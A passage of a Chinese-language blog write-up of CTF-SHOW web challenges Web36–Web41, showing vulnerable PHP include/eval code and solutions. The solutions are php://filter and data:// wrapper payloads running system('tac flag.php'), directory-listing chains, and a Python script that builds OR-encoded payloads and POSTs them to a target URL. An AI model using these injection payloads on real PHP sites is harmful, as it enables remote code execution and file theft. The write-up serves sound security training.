+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]?%<span class="number">3</span>E&amp;a=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里不再是<code>eval</code>而是<code>include</code>了</p>
+<p>下方打印了<code>flag</code>，所以<code>c</code>中必需包含<code>flag.txt</code>的内容</p>
+<p>这里需要用到<code>data伪协议</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br><span class="line"><span class="comment">#忘了这里对flag过滤进行绕过了，实则可以使用base64加密或者通配符</span></span><br><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|php|file/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></tbody></table></figure>
+<p>比起上题多过滤了<code>php</code>和<code>file</code></p>
+<p>一样的，用data伪协议和base64加密即可</p>
+<h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">".php"</span>);</span><br><span class="line">    }</span><br><span class="line">        </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>这次在后面拼接上了<code>.php</code></p>
+<blockquote>
+<p><code>.</code>是php的字符串拼接符</p>
+</blockquote>
+<p>但其实这个拼接没有任何作用</p>
+<p>先让我们来看看答案</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system('tac fla*');?&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>可以看到已经使用?&gt;进行闭合了，那么php代码已经执行完毕并结束了。</p>
+<p>强制给include添加后缀无法阻止伪协议内的php代码执行，只会在代码执行后报错</p>
+<h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }   </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这里把数字和几乎所有符号都过滤了，但是括号是中文括号，阴得没边了</p>
+<h3 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h3><ol>
+<li>得到当前目录</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>());</span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li>访问目录下文件</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></tbody></table></figure>
+<p>得到flag在目录下第三个文件中（倒数第二个）<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312150246343.png" alt="image-20250312150246343" style="zoom:67%;"></p>
+<p>为了减少next的使用</p>
+<blockquote>
+<p>数组移动操作</p>
+<p>end() ： 将内部指针指向数组中的最后一个元素，并输出<br>next() ：将内部指针指向数组中的下一个元素，并输出<br>prev() ：将内部指针指向数组中的上一个元素，并输出<br>reset() ： 将内部指针指向数组中的第一个元素，并输出<br>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
+</blockquote>
+<p>所以倒置一下目录</p>
+<ol>
+<li>倒置目录</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312151309809.png" alt="image-20250312151309809" style="zoom:50%;"></p>
+<ol>
+<li>数组指针后移</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li>读取flag.php</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))));</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312153231369.png" alt="image-20250312153231369"></p>
+<h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"echo(<span class="subst">$c</span>);"</span>);</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>比起上道题，这道题过滤掉了所有字母，而且注意使用的是POST传参</p>
+<p>可以看到还剩下一个 | 没有被过滤</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">contents = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        hex_i = <span class="string">'{:02x}'</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        hex_j = <span class="string">'{:02x}'</span>.<span class="built_in">format</span>(j)</span><br><span class="line">        preg = re.<span class="built_in">compile</span>(<span class="string">r'[0-9]|[a-z]|\^|\+|~|\$|\[|]|\{|}|&amp;|-'</span>, re.I)</span><br><span class="line">        <span class="keyword">if</span> preg.search(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_i, <span class="number">16</span>))) <span class="keyword">or</span> preg.search(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_j, <span class="number">16</span>))):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">'%'</span> + hex_i</span><br><span class="line">            b = <span class="string">'%'</span> + hex_j</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">int</span>(a[<span class="number">1</span>:], <span class="number">16</span>) | <span class="built_in">int</span>(b[<span class="number">1</span>:], <span class="number">16</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span>:</span><br><span class="line">                contents.append([c, a, b])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload1 = <span class="string">''</span></span><br><span class="line">    payload2 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> contents:</span><br><span class="line">            <span class="keyword">if</span> i == j[<span class="number">0</span>]:</span><br><span class="line">                payload1 += j[<span class="number">1</span>]</span><br><span class="line">                payload2 += j[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">'("'</span> + payload1 + <span class="string">'"|"'</span> + payload2 + <span class="string">'")'</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="built_in">input</span>(<span class="string">'url:'</span>)</span><br><span class="line">payload = make_payload(<span class="string">'system'</span>) + make_payload(<span class="string">'cat flag.php'</span>)</span><br><span class="line">response = requests.post(URL, data={<span class="string">'c'</span>: urllib.parse.unquote(payload)})</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></tbody></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="prev" title="通配符和正则表达式">
+      <i class="fa fa-chevron-left"></i> 通配符和正则表达式
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/" rel="next" title="CTF-SHOW刷题总结Web3">
+      CTF-SHOW刷题总结Web3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.querySelectorAll('.post-shell .post-body p').forEach(paragraph => {
+        if (paragraph.textContent.trim().toLowerCase() === '[toc]') {
+          paragraph.remove();
+        }
+      });
+
+      const copyText = async text => {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(text);
+          return true;
+        }
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.setAttribute('readonly', '');
+        textarea.style.position = 'fixed';
+        textarea.style.top = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        const result = document.execCommand('copy');
+        textarea.remove();
+        return result;
+      };
+
+      document.querySelectorAll('.post-shell .post-body figure.highlight, .post-shell .post-body > pre:not(.mermaid)').forEach(block => {
+        if (block.querySelector('.post-code-copy')) return;
+        block.classList.add('post-code-copyable');
+        const button = document.createElement('button');
+        button.type = 'button';
+        button.className = 'post-code-copy';
+        button.textContent = 'Copy';
+        button.addEventListener('click', async () => {
+          const codeElement = block.matches('figure.highlight') ? block.querySelector('.code') : block;
+          const code = (codeElement ? codeElement.innerText : '').replace(/\n$/, '');
+          try {
+            await copyText(code);
+            button.textContent = 'Copied';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          } catch (error) {
+            button.textContent = 'Failed';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          }
+        });
+        block.appendChild(button);
+      });
+
+      const viewer = document.createElement('div');
+      viewer.className = 'post-image-viewer';
+      viewer.innerHTML = '<button type="button" class="post-image-viewer-close">Close</button><img alt="">';
+      document.body.appendChild(viewer);
+      const viewerImage = viewer.querySelector('img');
+      const viewerState = {
+        scale: 1,
+        x: 0,
+        y: 0,
+        minScale: 1,
+        maxScale: 6,
+        isDragging: false,
+        isPinching: false,
+        startX: 0,
+        startY: 0,
+        originX: 0,
+        originY: 0,
+        touchDistance: 0,
+        touchScale: 1,
+        touchCenterX: 0,
+        touchCenterY: 0
+      };
+      const clampViewerScale = scale => Math.min(viewerState.maxScale, Math.max(viewerState.minScale, scale));
+      const applyViewerTransform = () => {
+        viewerImage.style.setProperty('--viewer-scale', viewerState.scale);
+        viewerImage.style.setProperty('--viewer-x', `${viewerState.x}px`);
+        viewerImage.style.setProperty('--viewer-y', `${viewerState.y}px`);
+      };
+      const resetViewerState = () => {
+        viewerState.scale = 1;
+        viewerState.x = 0;
+        viewerState.y = 0;
+        viewerState.isDragging = false;
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = 1;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+        viewer.classList.remove('is-dragging');
+        applyViewerTransform();
+      };
+      const zoomViewerAt = (clientX, clientY, nextScale) => {
+        const oldScale = viewerState.scale;
+        const scale = clampViewerScale(nextScale);
+        if (scale === oldScale) return;
+
+        const rect = viewerImage.getBoundingClientRect();
+        const centerX = rect.left + rect.width / 2;
+        const centerY = rect.top + rect.height / 2;
+        const ratio = scale / oldScale;
+        viewerState.x -= (clientX - centerX) * (ratio - 1);
+        viewerState.y -= (clientY - centerY) * (ratio - 1);
+        viewerState.scale = scale;
+
+        if (viewerState.scale === 1) {
+          viewerState.x = 0;
+          viewerState.y = 0;
+        }
+        applyViewerTransform();
+      };
+      const closeViewer = () => {
+        viewer.classList.remove('is-active', 'is-dragging');
+        document.documentElement.classList.remove('post-image-viewer-open');
+        resetViewerState();
+      };
+      const openViewer = image => {
+        resetViewerState();
+        viewerImage.src = image.currentSrc || image.src;
+        viewerImage.alt = image.alt || '';
+        viewer.classList.add('is-active');
+        document.documentElement.classList.add('post-image-viewer-open');
+      };
+      const touchDistance = touches => Math.hypot(
+        touches[0].clientX - touches[1].clientX,
+        touches[0].clientY - touches[1].clientY
+      );
+      const touchCenter = touches => ({
+        x: (touches[0].clientX + touches[1].clientX) / 2,
+        y: (touches[0].clientY + touches[1].clientY) / 2
+      });
+
+      document.querySelectorAll('.post-shell .post-body img').forEach(image => {
+        image.tabIndex = 0;
+        image.addEventListener('click', event => {
+          event.preventDefault();
+          openViewer(image);
+        });
+        image.addEventListener('keydown', event => {
+          if (event.key === 'Enter') {
+            image.click();
+          }
+        });
+      });
+
+      viewer.addEventListener('wheel', event => {
+        if (!viewer.classList.contains('is-active')) return;
+        event.preventDefault();
+        const factor = event.deltaY < 0 ? 1.14 : 0.88;
+        zoomViewerAt(event.clientX, event.clientY, viewerState.scale * factor);
+      }, { passive: false });
+
+      viewerImage.addEventListener('dblclick', event => {
+        event.preventDefault();
+        resetViewerState();
+      });
+
+      viewerImage.addEventListener('pointerdown', event => {
+        if (!viewer.classList.contains('is-active') || event.button > 0 || viewerState.isPinching) return;
+        if (event.pointerType === 'touch' && event.isPrimary === false) return;
+        event.preventDefault();
+        viewerState.isDragging = true;
+        viewerState.startX = event.clientX;
+        viewerState.startY = event.clientY;
+        viewerState.originX = viewerState.x;
+        viewerState.originY = viewerState.y;
+        viewer.classList.add('is-dragging');
+        viewerImage.setPointerCapture(event.pointerId);
+      });
+
+      viewerImage.addEventListener('pointermove', event => {
+        if (!viewerState.isDragging || viewerState.isPinching) return;
+        viewerState.x = viewerState.originX + event.clientX - viewerState.startX;
+        viewerState.y = viewerState.originY + event.clientY - viewerState.startY;
+        applyViewerTransform();
+      });
+
+      const stopViewerDrag = event => {
+        if (!viewerState.isDragging) return;
+        viewerState.isDragging = false;
+        viewer.classList.remove('is-dragging');
+        if (event && viewerImage.hasPointerCapture(event.pointerId)) {
+          viewerImage.releasePointerCapture(event.pointerId);
+        }
+      };
+      viewerImage.addEventListener('pointerup', stopViewerDrag);
+      viewerImage.addEventListener('pointercancel', stopViewerDrag);
+
+      viewerImage.addEventListener('touchstart', event => {
+        if (event.touches.length !== 2) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.isPinching = true;
+        viewerState.isDragging = false;
+        viewerState.touchDistance = touchDistance(event.touches);
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        viewer.classList.remove('is-dragging');
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchmove', event => {
+        if (event.touches.length !== 2 || !viewerState.touchDistance) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.x += center.x - viewerState.touchCenterX;
+        viewerState.y += center.y - viewerState.touchCenterY;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        applyViewerTransform();
+        const nextScale = viewerState.touchScale * (touchDistance(event.touches) / viewerState.touchDistance);
+        zoomViewerAt(center.x, center.y, nextScale);
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchend', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewerImage.addEventListener('touchcancel', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewer.addEventListener('click', event => {
+        if (event.target === viewer || event.target.classList.contains('post-image-viewer-close')) {
+          closeViewer();
+        }
+      });
+      window.addEventListener('keyup', event => {
+        if (event.key === 'Escape') {
+          closeViewer();
+        }
+      });
+    });
+  </script>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-SHOW"><span class="nav-number">1.</span> <span class="nav-text">CTF SHOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web29"><span class="nav-number">1.1.</span> <span class="nav-text">Web29</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.2.</span> <span class="nav-text">前置基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.0.1.</span> <span class="nav-text">eval()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#system%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.0.2.</span> <span class="nav-text">system函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.3.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.4.</span> <span class="nav-text">几种思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8egrep%E3%80%82egrep-grep-E"><span class="nav-number">1.1.4.0.1.</span> <span class="nav-text">用egrep。egrep &#x3D; grep -E</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5cat%EF%BC%88%E4%BD%BF%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%EF%BC%8C%E4%BD%86%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E9%9C%80%E8%A6%81%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81%EF%BC%89"><span class="nav-number">1.1.4.0.2.</span> <span class="nav-text">直接cat（使用通配符绕过，但无回显，需要查看源码）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%80%92%E5%BA%8F%E8%BE%93%E5%87%BA%EF%BC%88%E4%BD%BF%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%EF%BC%8C%E4%BD%86%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="nav-number">1.1.4.0.3.</span> <span class="nav-text">倒序输出（使用通配符绕过，但有回显）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E5%88%B6%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%8C%E5%86%8D%E6%9F%A5%E7%9C%8B%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.4.0.4.</span> <span class="nav-text">复制到另一个文件中，再查看另一个文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%87%BA%E4%B8%80%E4%B8%AAphp%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%B8%8D%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E4%BA%86"><span class="nav-number">1.1.4.0.5.</span> <span class="nav-text">直接输出一个php，这样就可以不需要绕过了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E9%85%8D%E5%90%88base64%E7%BC%96%E7%A0%81"><span class="nav-number">1.1.4.0.6.</span> <span class="nav-text">显示文件命令配合base64编码</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web30"><span class="nav-number">1.2.</span> <span class="nav-text">Web30</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">几种思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" 